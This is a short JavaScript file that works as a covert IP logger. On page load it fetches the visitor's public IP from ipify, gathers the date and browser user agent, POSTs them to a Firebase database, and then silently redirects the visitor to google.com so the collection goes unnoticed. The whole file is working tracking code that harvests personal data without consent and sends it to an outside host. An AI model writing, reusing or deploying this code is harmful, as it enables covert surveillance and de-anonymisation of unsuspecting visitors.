$(document).ready(()=>{
    $.getJSON("https://api.ipify.org?format=json",
    function (data) {
        a(data)
    })
});
async function a(a){
    var news = a.ip  
    var n = news.replaceAll(".", "")  
    var datum = Date() 
    var device = navigator.userAgent
    var json = JSON.stringify({
        ip: news, 
        date: datum,
        device: device
    })                 
    const f = await fetch("https://usrs-6ab7c-default-rtdb.europe-west1.firebasedatabase.app/"+n+".json",{
      headers:
     {
      'Accept': 'application/json',
      'Content-Type': "application/json",
     },
     method: "POST",
     body: json
    })
    window.location.replace("https://google.com")
}
